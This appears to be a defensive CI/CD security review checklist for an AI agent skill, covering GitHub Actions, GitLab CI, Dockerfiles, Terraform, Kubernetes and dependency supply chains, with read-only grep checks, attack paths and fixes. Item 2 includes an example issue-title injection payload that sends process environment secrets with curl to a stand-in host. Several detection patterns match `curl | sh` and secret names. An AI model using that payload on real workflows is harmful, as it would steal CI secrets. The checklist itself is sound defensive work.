# pipeline-security-review checklist

Work through every area that has files in the repo. Each item gives: what to check, the
evidence (a repo pattern or a read-only search), the attack path to look for, and the fix.

Every search below is one command that passes the read-only guard. Replace UPPERCASE
placeholders (`FILE`, `OWNER`, `REPO`, `BRANCH`) with literal values. Run one command per Bash
call. The scanner forms are in `../../raystack/references/scanners.md`; use them exactly.
A recursive grep over `.` with no `--include` also takes `--exclude='.env*'
--exclude-dir=.secrets --exclude-dir=.git`, so it never reads secrets.

The finding bar (SKILL.md section 4): no concrete attack path (who, what they send or push,
what they gain), no finding. It goes under "Worth hardening" instead.

Never print secret values (contract section 6). Use `grep -l`, `grep -c` or `grep -o` on the
name for secret patterns, and never open `.env*` files other than `.env.example`.

## CI: GitHub Actions

Workflows live in `.github/workflows/`. Composite actions in `.github/actions/` and
`action.yml` files run the same way; check them too. Run zizmor and actionlint first when
installed (forms in the scanners file), then confirm each hit by reading the workflow.

### 1. Untrusted code with privileges (pwn request)

- **`pull_request_target` or `workflow_run` never checks out and runs the PR's code.**
  Evidence: `grep -rlE 'pull_request_target|workflow_run' .github/workflows`, then in each file
  `grep -nE 'github[.]event[.]pull_request[.]head[.](sha|ref)|github[.]head_ref|workflow_run[.]head_(sha|branch)|refs/pull/' FILE`.
  Read the job: a checkout of `github.event.pull_request.head.sha` or `.head.ref` followed by any build, install, test or script step
  runs the fork's code. Attack path: anyone opens a fork PR that edits `package.json` scripts
  or a test; the job runs it with repo secrets and a write `GITHUB_TOKEN`. Fix: use
  `pull_request` for untrusted code; if `pull_request_target` is needed, check out the base
  only, or split into an unprivileged `pull_request` job and a `workflow_run` job that only
  reads its artifact as data.
- **Artifacts and caches from PR runs are data, not code.** Evidence: `workflow_run` jobs with
  `actions/download-artifact` or `actions/cache` restore before a run step. Attack path: the
  fork run uploads a poisoned artifact or cache that the privileged job executes. Fix: treat
  artifacts as untrusted input; no shared cache keys between PR and default-branch jobs.

### 2. Script injection from event fields

- **No untrusted `${{ github.event.* }}` inside `run:`.** Evidence:
  `grep -rnE 'github[.]event[.](issue|pull_request|comment|review|review_comment|discussion|head_commit|commits|pages)[^ ]*[.](title|body|name|email|message|label|head_ref|ref)|github[.]head_ref' .github/workflows`.
  Open each hit and see whether it sits in a `run:` block or an `actions/github-script`
  `script:` (injection) or in `env:` (safe). Attack path: anyone opens an issue or PR titled
  `a"; curl -d @/proc/self/environ https://evil.example; "` and the step runs it with the
  job's secrets. Fix: pass the value through `env:` and use `"$TITLE"` in the shell.
- **Untrusted input never reaches `GITHUB_ENV` or `GITHUB_OUTPUT`.** Evidence:
  `grep -rnE 'GITHUB_ENV|GITHUB_PATH|GITHUB_OUTPUT' .github/workflows`, then read what is
  written. Attack path: a PR title that writes `LD_PRELOAD` or `NODE_OPTIONS` into later steps.
  Fix: validate or never write event data there.

### 3. Actions pinned to a full commit SHA

- **Every third-party `uses:` is pinned to a 40-hex SHA.** Evidence:
  `grep -rnE 'uses:' .github/workflows`, then the same piped to
  `grep -vE '@[0-9a-f]{40}|uses: *[.]/|docker://'` to keep only tag or branch refs. Attack
  path: the action's maintainer account or repo is taken over and the tag is moved (as with
  `tj-actions/changed-files` in 2025); every workflow on the tag runs the new code with its
  secrets. A finding needs secrets or a write token in that job; else "Worth hardening".
  GitHub's own `actions/*` and `github/*` on tags are "Worth hardening". Fix: pin to the
  SHA with the tag in a comment (`@<sha> # v4.2.2`) and let Dependabot or Renovate bump it.
- **Docker actions and `container:` images are pinned.** Evidence: `docker://` refs and
  `image:` lines with a tag but no `@sha256:`. Same attack path through the image registry.

### 4. Token permissions

- **Top-level `permissions:` is set and narrow.** Evidence:
  `grep -rLE '^permissions:' .github/workflows` (files with no top-level block; they get the
  repo default, often write-all) and `grep -rnE 'permissions: *write-all|: *write' .github/workflows`.
  Attack path: any injection or compromised action in that workflow gets a token that can push
  to the default branch, create releases or edit workflows. A finding needs a way in (items
  1 to 3); else "Worth hardening". Fix: `permissions: contents: read` at the top, and add
  write scopes per job only where needed.
- **Checkout does not keep the token on disk.** Evidence: `actions/checkout` without
  `persist-credentials: false` in jobs that upload artifacts or run third-party code. Attack
  path: the token in `.git/config` ships in an uploaded artifact. Fix: `persist-credentials: false`.

### 5. Secrets reachable from fork pull requests

- **Secrets reach only trusted runs.** Evidence: `grep -rnE 'secrets[.]' .github/workflows`
  in workflows triggered by `pull_request_target`, `workflow_run` or `issue_comment`; and for
  private repos, whether "Send secrets to workflows from fork pull requests" is on (Settings,
  Actions; ask the user). Attack path: a fork PR reaches a step that has the secret and runs
  its code or prints it. Fix: environments with required reviewers for secret-using jobs;
  keep fork secrets off.
- **Comment-triggered jobs check who commented.** Evidence: `issue_comment` workflows with no
  `author_association` check. Attack path: anyone comments `/deploy` on a PR. Fix: require
  `OWNER`, `MEMBER` or `COLLABORATOR`.

### 6. Self-hosted runners on public repos

- **Public repos use GitHub-hosted runners for PR jobs.** Evidence:
  `grep -rnE 'runs-on:.*self-hosted' .github/workflows` and the repo visibility (consent ask,
  or `gh api repos/OWNER/REPO --jq .visibility`). Attack path: anyone opens a fork PR that runs
  on the self-hosted runner, keeps a process alive and reads later jobs' secrets or the
  network the runner sits on. Fix: GitHub-hosted runners for public repos, or ephemeral
  runners with "Require approval for all outside collaborators".

### 7. Cloud OIDC trust

- **The cloud role trusts one repo and branch only.** Look for a wildcard in
  `token.actions.githubusercontent.com:sub`. Evidence (IaC):
  `grep -rnE 'token[.]actions[.]githubusercontent[.]com:sub' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git --exclude-dir=node_modules .`,
  then read the value: `repo:ORG/*`, `repo:ORG/REPO:*`, `StringLike` with `*`, or no `sub`
  condition at all. Attack path: any branch, fork PR environment or other repo in the org
  runs a workflow that assumes the deploy role. Fix: `StringEquals` on
  `repo:ORG/REPO:ref:refs/heads/main` or `repo:ORG/REPO:environment:production`. The live role
  in the account belongs to `aws-security-review` (its item 2.6); GCP workload identity and
  Azure federated credentials get the same check here, by reading.

### 8. GitLab CI

Read `.gitlab-ci.yml` and its `include:` files with the same items:
- Injection: `CI_MERGE_REQUEST_TITLE`, `CI_MERGE_REQUEST_DESCRIPTION`, `CI_COMMIT_MESSAGE` or
  `CI_COMMIT_REF_NAME` used unquoted in `script:` (`grep -nE 'CI_MERGE_REQUEST_(TITLE|DESCRIPTION)|CI_COMMIT_(MESSAGE|REF_NAME|TITLE)' .gitlab-ci.yml`).
- Pinning: `include:` with `remote:` or `project:` and no `ref:` set to a SHA; `image:` with
  `latest` or no tag.
- Secrets: variables not marked protected, reachable from merge request pipelines on forks.
- Runners: shared or self-managed runners tagged for public projects' MR pipelines.
- OIDC: `id_tokens:` audiences and the cloud trust on `project_path` and `ref`, as item 7.

## Containers

Run hadolint on each Dockerfile when installed (form in the scanners file). Then check by
reading every `Dockerfile*` and `Containerfile`.

### 9. Runtime user

- **The final stage sets a non-root `USER`.** Evidence: `grep -nE '^USER' FILE` (none means
  root) and the last `FROM` stage. Attack path: an app RCE (from `app-security-review`)
  becomes root in the container, with write access to the app and easier escape. A root user
  alone is "Worth hardening". Fix: `USER 10001` after installing, files owned by root.

### 10. Base images pinned

- **`FROM` uses a version tag and a digest, never `latest`.** Evidence:
  `grep -nE '^FROM' FILE`; flag `latest`, no tag, or no `@sha256:`. Attack path: a takeover
  or typo-squat of the image name, or a moved tag, ships new code into the next build. Fix:
  `FROM node:22.11-slim@sha256:...` and let Dependabot or Renovate bump it.

### 11. Secrets in the image

- **No secrets in `ARG`, `ENV` or copied files.** Evidence:
  `grep -noE '^(ARG|ENV) +[A-Za-z_]*(TOKEN|SECRET|PASSWORD|PASS|KEY|CREDENTIAL)[A-Za-z_]*' FILE`
  (names only), `grep -nE '^(COPY|ADD) .*([.]env|[.]npmrc|[.]pypirc|id_rsa|credentials|[.]pem)' FILE`,
  and whether `.dockerignore` excludes `.env` and `.git` (`grep -cE '^[.]env|^[.]git' .dockerignore`).
  Attack path: anyone who can pull the image (a public registry, or a leaked pull token) runs
  `docker history` or unpacks a layer and reads the key. Fix: BuildKit `--mount=type=secret`,
  runtime env from the platform, a `.dockerignore`; rotate any key already pushed.

### 12. Remote code at build time

- **No `ADD` from a URL and no `curl | sh`.** Evidence: `grep -nE '^ADD +https?://' FILE`
  and `grep -nE '(curl|wget)[^|]*[|] *(sudo +)?(ba|z)?sh' FILE` (also run the second on
  `.github/workflows` with `-rn`). Attack path: whoever controls that URL or its DNS, or sits
  on the path, runs code in the build, often with build secrets. Fix: download a pinned
  version, check `sha256sum -c`, then run it.

## IaC and Kubernetes

checkov and trivy are never run (D-006); list them under "Commands for you to run" when
IaC, manifests or images are found (see SKILL.md). Read the files instead.

### 13. Terraform, CloudFormation, CDK, Pulumi

- **No state, plans or secrets committed.** Evidence: `git ls-files '*.tfstate' '*.tfstate.backup' '*.tfplan' '*.tfvars'`.
  Attack path: anyone with repo read gets every secret the state holds. Fix: remote state,
  rotate what it held.
- **Misconfigurations in code.** Read for: ingress from `0.0.0.0/0` on admin or database
  ports, public buckets or ACLs, IAM `"*"` actions or resources, encryption off, logging off,
  hard-coded credentials (`grep -rlE 'access_key|secret_key|password *=' --include='*.tf' .`).
  AWS account findings go to `aws-security-review`, which confirms them live: note the file
  and point there. Other clouds: report them here with file:line.
- **Modules and providers are pinned.** Evidence: `source =` with a git URL and no `?ref=`
  SHA or tag, providers with no version constraint and no `.terraform.lock.hcl` committed.
  Attack path: the module repo changes and the next `apply` runs it. Fix: pin and commit the
  lock file.

### 14. Kubernetes and Helm

- **Pods do not run privileged or as root.** Evidence: `grep -rnE 'privileged: *true|allowPrivilegeEscalation: *true|hostNetwork: *true|hostPID: *true|hostPath:|runAsUser: *0' --include='*.yaml' --include='*.yml' .`
  and no `runAsNonRoot: true`. Attack path: an RCE in one pod reads the node and other pods'
  secrets. Fix: a restricted `securityContext`, Pod Security Admission `restricted`.
- **RBAC is narrow.** Evidence: `cluster-admin` bindings, `verbs: ["*"]` or `resources: ["*"]`
  for app service accounts, `automountServiceAccountToken` left on. Attack path: a pod RCE
  uses the mounted token to read every Secret. Fix: one role per app with named verbs.
- **No plain secrets in manifests.** Evidence: `grep -rlE '^kind: *Secret' --include='*.yaml' --include='*.yml' .`
  (names only) with `data:` or `stringData:` committed. Fix: sealed or external secrets.
- **Images are pinned.** `image:` with `latest` or no tag, as item 10.
- The running cluster belongs to `infra-review`.

## Supply chain

### 15. Lockfiles committed and used

- **Every manifest has a committed lockfile.** Evidence:
  `git ls-files package-lock.json npm-shrinkwrap.json yarn.lock pnpm-lock.yaml composer.lock poetry.lock uv.lock Pipfile.lock Gemfile.lock go.sum Cargo.lock`.
- **CI and Dockerfiles install from the lockfile.** Evidence:
  `grep -rnE 'npm (i|install)|yarn( install)?|pnpm (i|install)|pip install|composer (install|update)|bundle install|poetry install' .github/workflows`
  (and the same on `.gitlab-ci.yml` and each Dockerfile). Look for `npm ci`, `yarn install
  --immutable` or `--frozen-lockfile`, `pnpm install --frozen-lockfile`, `pip install
  --require-hashes`, `composer install` (not `update`). Attack path: a new malicious patch
  release of a dependency lands in the next build without review. A finding needs a
  publishing job with secrets; else "Worth hardening". Fix: the frozen form.
- **Known CVEs.** With consent, run osv-scanner on the lockfiles (form in the scanners file).
  Confirm the vulnerable package is in a build or runtime path before ranking it.

### 16. Install scripts from dependencies

- **Dependency install scripts do not run with secrets.** Evidence:
  `grep -c '"hasInstallScript": true' package-lock.json`, `.npmrc` with `ignore-scripts`, pnpm
  `onlyBuiltDependencies`, and whether the install step shares a job with publish or deploy
  secrets. Attack path: a compromised package's `postinstall` reads `NPM_TOKEN` or cloud keys
  from the job env. Fix: `npm ci --ignore-scripts` plus an allow-list, and keep install apart
  from secret-holding steps.

### 17. Private scopes pinned to their registry

- **Private package names cannot resolve on the public registry.** Evidence: scoped names in
  `package.json` (`@ORG/`) and `grep -oE '^@[a-z0-9-]+:registry' .npmrc` (scope only; the file
  can hold a token); `grep -rnE 'extra-index-url' --include='*.txt' --include='*.toml' --include='*.cfg' --include='*.ini' .`
  for pip; Composer `repositories` without `canonical: true`. Attack path: an attacker
  publishes the private name on the public registry with a higher version; the build installs
  it (dependency confusion). Fix: a scope-to-registry line, `--index-url` instead of
  `--extra-index-url`, and claiming the names publicly.

### 18. Update bots and branch protection

- **Dependabot or Renovate is set up, including for actions.** Evidence:
  `ls .github/dependabot.yml renovate.json .github/renovate.json .renovaterc.json` and
  `grep -n 'package-ecosystem' .github/dependabot.yml` (look for `github-actions` and
  `docker`). No bot is "Worth hardening": pinned SHAs and images then go stale.
- **The default branch has branch protection or a ruleset.** Evidence, only after consent:
  `gh api repos/OWNER/REPO/branches/BRANCH/protection` and `gh api repos/OWNER/REPO/rules/branches/BRANCH`.
  A 404 "Branch not protected" with no rules means unprotected. A 403 means the token is not
  an admin: list the command for the human. Check required reviews, required status checks,
  `enforce_admins`, force pushes and deletions off, and a `CODEOWNERS` entry for
  `.github/workflows/`. Attack path: one stolen contributor token, or one contributor, pushes
  to the default branch and the deploy workflow ships it with production secrets. Fix:
  require a review and the CI checks, block force pushes, include admins.
